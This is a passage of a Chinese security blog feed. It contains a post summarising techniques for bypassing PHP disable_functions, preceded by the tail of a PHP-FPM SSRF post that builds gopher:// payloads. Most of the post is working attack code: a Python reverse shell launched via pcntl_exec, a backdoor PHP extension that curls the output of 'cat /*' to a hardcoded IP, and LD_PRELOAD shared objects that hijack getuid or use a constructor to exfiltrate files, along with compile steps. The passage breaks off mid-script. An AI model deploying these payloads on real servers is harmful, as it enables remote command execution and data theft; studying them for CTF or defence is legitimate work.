class="hljs-comment"># 修改点 4</span><br>    <span class="hljs-comment"># response = client.request(params, content)</span><br>    <span class="hljs-comment"># print(force_text(response))</span><br>    request_ssrf = quote(client.request(params, content))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="hljs-built_in">str</span>(args.port) + <span class="hljs-string">&quot;/_&quot;</span> + request_ssrf)<br><br></code></pre></td></tr></table></figure><p>用法和原来一样</p><p><code>python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP-FPM 是 FastCGI 的一个具体实现（协议解析器）&lt;/p&gt;
&lt;p&gt;Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据&lt;/p&gt;
&lt;p&gt;举个例子，用户访问&lt;code&gt;h</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php-fpm" scheme="https://www.dr0n.top/tags/php-fpm/"/>
    
    <category term="中间件" scheme="https://www.dr0n.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>绕过disable_fuctions的方法总结</title>
    <link href="https://www.dr0n.top/posts/5f3ac2d3/"/>
    <id>https://www.dr0n.top/posts/5f3ac2d3/</id>
    <published>2024-07-17T04:00:00.000Z</published>
    <updated>2024-09-24T09:25:40.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常规函数函数绕过"><a href="#常规函数函数绕过" class="headerlink" title="常规函数函数绕过"></a>常规函数函数绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//exec</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//shell_exec</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//system</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><br><span class="hljs-comment">//passthru</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><br><span class="hljs-comment">//popen</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;whoami&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">//proc_open</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;whoami&quot;</span>; <span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)); <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>); <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);&#125;<br></code></pre></td></tr></table></figure><p>如果安装了 pcntl 插件，则可以利用pcntl_exec来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#exec.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/exp.sh&quot;</span>));<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#/tmp/exp.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ls -l /<br></code></pre></td></tr></table></figure><p>或者与python结合来反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&quot;/usr/bin/python3&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));<br></code></pre></td></tr></table></figure><h1 id="使用ext-skel制作恶意php扩展"><a href="#使用ext-skel制作恶意php扩展" class="headerlink" title="使用ext_skel制作恶意php扩展"></a>使用ext_skel制作恶意php扩展</h1><p>disable_fuctions禁用的是php的函数，使用php扩展调用c的函数即可绕过</p><p>这种利用方式的条件较为苛刻</p><p>1：知道扩展目录并且目录可写（覆盖到已经引用的扩展，比如mysqli.so）<br>2：能够载入php扩展（重启或者使用php命令行执行）<br>3：能够调用自定义函数</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;phpinfo&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;run&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;php -r &#x27;ctfshow();&#x27;&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><blockquote><p>ext_skel是php源码包里自带的一个开发生成工具</p></blockquote><p>首先在PHP源码下的ext目录下执行</p><p><code>php ext_skel.php --ext backdoor --std</code></p><p>运行后会生成一个backdoor目录，然后修改生成的c文件的代码</p><ol><li>在头部添加 stdlib.h ，例子中的23行</li><li>修改函数名，几处函数名要一致，例如37行和98行的函数名对应，这里用的是ctfshow</li><li>在自定义函数中添加system执行命令即可，例如40行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | PHP Version 7                                                        |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | Copyright (c) The PHP Group                                          |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | This source file is subject to version 3.01 of the PHP license,      |</span><br><span class="hljs-comment">   | that is bundled with this package in the file LICENSE, and is        |</span><br><span class="hljs-comment">   | available through the world-wide-web at the following url:           |</span><br><span class="hljs-comment">   | http://www.php.net/license/3_01.txt                                  |</span><br><span class="hljs-comment">   | If you did not receive a copy of the PHP license and are unable to   |</span><br><span class="hljs-comment">   | obtain it through the world-wide-web, please send a note to          |</span><br><span class="hljs-comment">   | license@php.net so we can mail you a copy immediately.               |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">   | Author:  |</span><br><span class="hljs-comment">   +----------------------------------------------------------------------+</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> HAVE_CONFIG_H</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ext/standard/info.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php_backdoor.h&quot;</span></span><br><br><span class="hljs-comment">/* For compatibility with older PHP versions */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span><br><span class="hljs-meta">        ZEND_PARSE_PARAMETERS_START(0, 0) \</span><br><span class="hljs-meta">        ZEND_PARSE_PARAMETERS_END()</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; void backdoor_test1()</span><br><span class="hljs-comment"> */</span><br>PHP_FUNCTION(ctfshow)<br>&#123;<br>        ZEND_PARSE_PARAMETERS_NONE();<br>        system(<span class="hljs-string">&quot;curl http://47.99.77.52:6666/?s=`cat /*`&quot;</span>);<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; string backdoor_test2( [ string $var ] )</span><br><span class="hljs-comment"> */</span><br>PHP_FUNCTION(backdoor_test2)<br>&#123;<br>        <span class="hljs-type">char</span> *var = <span class="hljs-string">&quot;World&quot;</span>;<br>        <span class="hljs-type">size_t</span> var_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;World&quot;</span>) - <span class="hljs-number">1</span>;<br>        zend_string *retval;<br><br>        ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>                Z_PARAM_OPTIONAL<br>                <span class="hljs-title function_">Z_PARAM_STRING</span><span class="hljs-params">(var, var_len)</span><br>        <span class="hljs-title function_">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span>;<br><br>        retval = strpprintf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;Hello %s&quot;</span>, var);<br><br>        RETURN_STR(retval);<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125;*/</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span><br><span class="hljs-comment"> */</span><br>PHP_RINIT_FUNCTION(backdoor)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span><br>        ZEND_TSRMLS_CACHE_UPDATE();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        <span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span><br><span class="hljs-comment"> */</span><br>PHP_MINFO_FUNCTION(backdoor)<br>&#123;<br>        php_info_print_table_start();<br>        php_info_print_table_header(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;backdoor support&quot;</span>, <span class="hljs-string">&quot;enabled&quot;</span>);<br>        php_info_print_table_end();<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; arginfo</span><br><span class="hljs-comment"> */</span><br>ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test1, <span class="hljs-number">0</span>)<br>ZEND_END_ARG_INFO()<br><br>ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test2, <span class="hljs-number">0</span>)<br>        ZEND_ARG_INFO(<span class="hljs-number">0</span>, str)<br>ZEND_END_ARG_INFO()<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; backdoor_functions[]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> zend_function_entry backdoor_functions[] = &#123;<br>        PHP_FE(ctfshow,         arginfo_backdoor_test1)<br>        PHP_FE(backdoor_test2,          arginfo_backdoor_test2)<br>        PHP_FE_END<br>&#125;;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-comment">/* &#123;&#123;&#123; backdoor_module_entry</span><br><span class="hljs-comment"> */</span><br>zend_module_entry backdoor_module_entry = &#123;<br>        STANDARD_MODULE_HEADER,<br>        <span class="hljs-string">&quot;backdoor&quot;</span>,                                     <span class="hljs-comment">/* Extension name */</span><br>        backdoor_functions,                     <span class="hljs-comment">/* zend_function_entry */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_MINIT - Module initialization */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_MSHUTDOWN - Module shutdown */</span><br>        PHP_RINIT(backdoor),                    <span class="hljs-comment">/* PHP_RINIT - Request initialization */</span><br>        <span class="hljs-literal">NULL</span>,                                                   <span class="hljs-comment">/* PHP_RSHUTDOWN - Request shutdown */</span><br>        PHP_MINFO(backdoor),                    <span class="hljs-comment">/* PHP_MINFO - Module info */</span><br>        PHP_BACKDOOR_VERSION,           <span class="hljs-comment">/* Version */</span><br>        STANDARD_MODULE_PROPERTIES<br>&#125;;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_DL_BACKDOOR</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ZTS</span><br>ZEND_TSRMLS_CACHE_DEFINE()<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>ZEND_GET_MODULE(backdoor)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">phpize<br>./configure<br>make<br>make install<br></code></pre></td></tr></table></figure><p>就会在modules目录下生成.so文件，然后将生成的恶意文件上传或写入到目标的扩展目录，使用<code>php -r</code>调用，就能执行自定义的命令了</p><p>注意，如果制作so的环境的php版本于靶机的php版本不同，则可能会产生如下错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning: PHP Startup: backdoor: Unable to initialize module<br>Module compiled with module API=20190902<br>PHP    compiled with module API=20180731<br>These options need to match<br> <span class="hljs-keyword">in</span> Unknown on line 0<br><br>Deprecated: Directive <span class="hljs-string">&#x27;track_errors&#x27;</span> is deprecated <span class="hljs-keyword">in</span> Unknown on line 0<br><br>Fatal error: Uncaught Error: Call to undefined <span class="hljs-keyword">function</span> ctfshow() <span class="hljs-keyword">in</span> Command line code:1<br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br>  thrown <span class="hljs-keyword">in</span> Command line code on line 1<br></code></pre></td></tr></table></figure><p>这时候需要修改<code>/usr/include/php/20190902/Zend/zend_modules.h</code>(具体路径可能不一致)文件中的<code>ZEND_MODULE_API_NO</code>的值为上面报错中的值<code>20180731</code></p><p>然后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">make clean<br>phpize<br>./configure<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><h1 id="利用-LD-PRELOAD-环境变量"><a href="#利用-LD-PRELOAD-环境变量" class="headerlink" title="利用 LD_PRELOAD 环境变量"></a>利用 LD_PRELOAD 环境变量</h1><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。</p></blockquote><p>总的来说就是通过LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p><p>需要的条件如下</p><ol><li>创建的恶意so文件可以上传到目标主机</li><li>能够控制 LD_PRELOAD 环境变量的值，比如 putenv() 函数</li><li>需要通过某个可以创建新进程的函数来加载 LD_PRELOAD 中的 .so 文件，比如 mail()、imap_mail()、mb_send_mail() 和 error_log() 函数等</li></ol><h2 id="劫持系统函数"><a href="#劫持系统函数" class="headerlink" title="劫持系统函数"></a>劫持系统函数</h2><p>在php中启动新进程时会自动调用许多的函数和api等等，其中 getuid 函数来确认进程属主(执行权限）</p><p>通过<code>man 2 getuid</code>查看函数原型</p><p>可以发现没有参数并且很常用，符合劫持函数的要求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">GETUID(2)                                                        Linux Programmer&#x27;s Manual                                                        GETUID(2)<br><br>NAME<br>       getuid, geteuid - get user identity<br><br>SYNOPSIS<br>       #include &lt;unistd.h&gt;<br>       #include &lt;sys/types.h&gt;<br><br>       uid_t getuid(void);<br>       uid_t geteuid(void);<br><br>DESCRIPTION<br>       getuid() returns the real user ID of the calling process.<br><br>       geteuid() returns the effective user ID of the calling process.<br><br>ERRORS<br>       These functions are always successful.<br></code></pre></td></tr></table></figure><p>劫持getuid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span>&#123;<br>        system(<span class="hljs-string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)==<span class="hljs-literal">NULL</span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>        unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>        payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>生成动态链接库</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>将 hack.so 上传并通过环境变量 LD_PRELOAD 指定后，只要新建进程，就会执行我们的恶意代码</p><p>php中部分可以新建进程的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">system<br>shell_exec<br>exec<br>passthru<br>proc_open<br>popen<br>pcntl<br>mail<br>imap_mail<br>mb_send_mail<br>error_log<br>libvirt_connect<br>gnupg_init<br>imagick<br></code></pre></td></tr></table></figure><p>还可以通过<code>strace -f php 1.php 2&gt;&amp;1 | grep execve</code>命令来查看是否创建了新的进程</p><p><img src="/img/summary/disable_functions-1.png"></p><h2 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h2><p>但是某些函数并不会调用getuid或者被禁用，这时候就需要更加通用的方式，不局限于劫持某一函数</p><p>在 GCC 中有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><h2 id="无上传点时的利用姿势"><a href="#无上传点时的利用姿势" class="headerlink" title="无上传点时的利用姿势"></a>无上传点时的利用姿势</h2><p>当没有表面上的上传点时可以考虑利用临时文件</p><p><strong>一：php的临时文件</strong></p><p>php的临时文件一般在<code>/tmp</code>目录下，如果可以列目录看到文件名的话可以考虑利用，否则很难爆破文件名</p><p><strong>二：nginx的body缓存机制</strong></p><p>如果传输的数据大于16k，则nginx会缓存。虽然说nginx会保存文件，但是nginx会在转发给php-fpm后就删除掉了(在php解释执行之前)</p><p>这就不能直接利用了，需要用到linux的一个特性：<code>/proc/PID/fd/&#123;1&#125;</code>去读取（条件是php和nginx的执行用户名是相同的才可以访问）</p><p>一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> 